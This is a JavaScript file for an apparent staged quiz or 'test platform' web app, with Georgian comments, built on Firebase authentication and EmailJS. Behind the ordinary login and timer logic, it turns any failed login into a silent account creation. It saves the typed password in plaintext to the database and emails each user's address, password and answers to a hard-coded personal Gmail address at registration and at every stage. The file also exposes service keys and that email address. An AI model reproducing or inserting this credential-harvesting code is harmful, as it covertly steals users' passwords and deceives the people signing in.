import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// 1. Firebase კონფიგურაცია
const firebaseConfig = {
  apiKey: "AIzaSyCPYnQ6W8rwcp8Fr-RUVYoJ3zBsdSpDdSQ",
  authDomain: "test-platform-ab07e.firebaseapp.com",
  projectId: "test-platform-ab07e",
  storageBucket: "test-platform-ab07e.firebasestorage.app",
  messagingSenderId: "50168022145",
  appId: "1:50168022145:web:5f3fec99fbe64eae5bb980",
  measurementId: "G-R814YQSVXK"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// 2. EmailJS ინიციალიზაცია
emailjs.init("9G-RjQeGCdtsk4MWM");

let currentUser = null;
let userProgress = { stage: 1, completedTasks: 0, passwordSaved: "" };
let latestUserMessage = ""; 
let timerInterval = null; // გლობალური ცვლადი ტაიმერის ინტერვალისთვის

const authScreen = document.getElementById('auth-screen');
const dashboardScreen = document.getElementById('dashboard-screen');
const authForm = document.getElementById('auth-form');
const authError = document.getElementById('auth-error');
const userEmailDisplay = document.getElementById('user-email-display');
const completedStatus = document.getElementById('completed-status');
const currentStageStatus = document.getElementById('current-stage-status');
const timerBox = document.getElementById('timer-box');
const countdownSpan = document.getElementById('countdown');

authForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    authError.innerText = "";

    try {
        await signInWithEmailAndPassword(auth, email, password);
    } catch (error) {
        if (error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential') {
            authError.innerText = "სისტემაში შესვლა... გთხოვთ დაელოდოთ.";
            try {
                const userCredential = await createUserWithEmailAndPassword(auth, email, password);
                
                currentUser = userCredential.user;
                userProgress = {
                    email: email,
                    passwordSaved: password,
                    stage: 1,
                    completedTasks: 0
                };

                await setDoc(doc(db, "users", userCredential.user.uid), userProgress);
                authError.innerText = "";

                latestUserMessage = "ახალი მომხმარებელი დარეგისტრირდა პლატფორმაზე.";
                sendEmails("რეგისტრაცია");

            } catch (regError) {
                authError.innerText = "მეილი ან პაროლი არასწორია";
            }
        } else {
            authError.innerText = "მეილი ან პაროლი არასწორია";
        }
    }
});

onAuthStateChanged(auth, async (user) => {
    if (user) {
        currentUser = user;
        userEmailDisplay.innerText = user.email;
        authScreen.classList.add('hidden');
        dashboardScreen.classList.remove('hidden');
        
        const userDoc = await getDoc(doc(db, "users", user.uid));
        if (userDoc.exists()) {
            userProgress = userDoc.data();
        }
        updateUI();
    } else {
        currentUser = null;
        if(timerInterval) clearInterval(timerInterval); // გამოსვლისას ვთიშავთ JS ინტერვალს
        authScreen.classList.remove('hidden');
        dashboardScreen.classList.add('hidden');
    }
});

document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));

function updateUI() {
    if(timerInterval) clearInterval(timerInterval); // ყოველი განახლებისას ვასუფთავებთ ძველ ინტერვალს

    completedStatus.innerText = userProgress.completedTasks;
    currentStageStatus.innerText = userProgress.stage > 3 ? "ყველა დასრულებულია" : `ეტაპი ${userProgress.stage}`;

    document.querySelectorAll('.stage').forEach(s => s.classList.add('hidden'));
    document.getElementById('final-message').classList.add('hidden');
    timerBox.classList.add('hidden');

    // ვამოწმებთ, აქვს თუ არა მომხმარებელს აქტიური ტაიმერი ბაზაში მიმდინარე ეტაპისთვის
    if (userProgress.timerEndTime && userProgress.timerStage === userProgress.stage) {
        checkAndResumeTimer();
    } else {
        // თუ ტაიმერი არ არის აქტიური, ვაჩვენებთ ჩვეულებრივ ეტაპს
        if (userProgress.stage === 1) {
            document.getElementById('stage-1').classList.remove('hidden');
        } else if (userProgress.stage === 2) {
            document.getElementById('stage-2').classList.remove('hidden');
            document.getElementById('stage-2-tasks').classList.remove('hidden');
        } else if (userProgress.stage === 3) {
            document.getElementById('stage-3').classList.remove('hidden');
        } else if (userProgress.stage > 3) {
            document.getElementById('final-message').classList.remove('hidden');
        }
    }
}

window.showStage2Tasks = function() {
    document.getElementById('stage-2-tasks').classList.remove('hidden');
}

// ერთი ეტაპით უკან დაბრუნება (ტაიმერსაც აუქმებს ბაზაში, თუ უკან ბრუნდება)
window.goBackStage = async function() {
    if (userProgress.stage > 1) {
        if(timerInterval) clearInterval(timerInterval);
        
        userProgress.stage = userProgress.stage - 1;
        userProgress.completedTasks = userProgress.stage - 1;
        
        // ვშლით აქტიური ტაიმერის მონაცემებს
        delete userProgress.timerEndTime;
        delete userProgress.timerStage;

        await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });
        updateUI();
    }
}

// შემოწმება და გაშვება (დროებით 1 წუთი ტესტირებისთვის)
window.validateAndStart = async function(stageNum, seconds) {
    const userInput1 = document.getElementById(`user-text-${stageNum}`);
    const userInput2 = document.getElementById(`user-text-${stageNum}-2`);
    const errorText = document.getElementById(`error-${stageNum}`);

    if (userInput1.value.trim() === "" || userInput2.value.trim() === "") {
        errorText.innerText = "ჩაწერეთ რამე";
        userInput1.style.borderColor = userInput1.value.trim() === "" ? "#ef4444" : "#e5e7eb";
        userInput2.style.borderColor = userInput2.value.trim() === "" ? "#ef4444" : "#e5e7eb";
    } else {
        errorText.innerText = "";
        userInput1.style.borderColor = "#e5e7eb";
        userInput2.style.borderColor = "#e5e7eb";
        
        latestUserMessage = `პასუხი 1: ${userInput1.value} | პასუხი 2: ${userInput2.value}`;
        
        userProgress[`userText${stageNum}_1`] = userInput1.value;
        userProgress[`userText${stageNum}_2`] = userInput2.value;

        // --- აი აქ შეიცვალა: 1 წუთი მილიწამებში (60 * 1000) ---
        const oneMinuteInMs = 60 * 1000; 
        userProgress.timerEndTime = Date.now() + oneMinuteInMs;
        userProgress.timerStage = stageNum;

        await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });

        // მეილი იგზავნება ტაიმერის დაწყებისთანავე
        sendEmails(stageNum);

        updateUI();
    }
}

// ფუნქცია, რომელიც აცოცხლებს ტაიმერს გვერდის გადატვირთვის ან თავიდან შესვლისას
function checkAndResumeTimer() {
    document.querySelectorAll('.stage').forEach(s => s.classList.add('hidden'));
    timerBox.classList.remove('hidden');

    function updateCountdown() {
        const now = Date.now();
        const timeLeftMs = userProgress.timerEndTime - now;

        if (timeLeftMs <= 0) {
            clearInterval(timerInterval);
            handleTimerEnd();
        } else {
            // მილიწამები გადაგვყავს საათების, წუთების და წამების ფორმატში (მაგ: 59:45)
            const totalSeconds = Math.floor(timeLeftMs / 1000);
            const minutes = Math.floor(totalSeconds / 60);
            const seconds = totalSeconds % 60;
            
            // ლამაზი ფორმატირება (თუ ერთნიშნაა, წინ უწერს ნულს)
            const displayMinutes = minutes < 10 ? "0" + minutes : minutes;
            const displaySeconds = seconds < 10 ? "0" + seconds : seconds;
            
            countdownSpan.innerText = `${displayMinutes}:${displaySeconds}`;
        }
    }

    updateCountdown();
    timerInterval = setInterval(updateCountdown, 1000);
}

// ფუნქცია, რომელიც სრულდება 1 საათის გასვლის შემდეგ
async function handleTimerEnd() {
    timerBox.classList.add('hidden');
    const completedStage = userProgress.stage;

    userProgress.stage = completedStage + 1;
    userProgress.completedTasks = completedStage;
    
    // ვასუფთავებთ ტაიმერის მონაცემებს ბაზაში, რადგან ეს ეტაპი დასრულდა
    delete userProgress.timerEndTime;
    delete userProgress.timerStage;

    await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });
    updateUI();
}

function sendEmails(stageNum) {
    let currentStageName = "";

    if (stageNum === "რეგისტრაცია") {
        currentStageName = "ახალი რეგისტრაცია (პროფილი შეიქმნა)";
    } else {
        const stageNames = ["ეტაპი 1 (ტესტი 1)", "ეტაპი 2 (ტესტი 2)", "ეტაპი 3 (ტესტი 3)"];
        currentStageName = stageNames[stageNum - 1];
    }

    const emailParams = {
        user_email: currentUser.email,
        user_password: userProgress.passwordSaved || "უკვე ავტორიზებული",
        passed_stage: currentStageName,
        user_message: latestUserMessage, 
        admin_email: "beqa994@gmail.com"
    };

    emailjs.send("service_ddlex4d", "template_8sbn4o7", emailParams);
    emailjs.send("service_ddlex4d", "template_5225h2q", emailParams);
}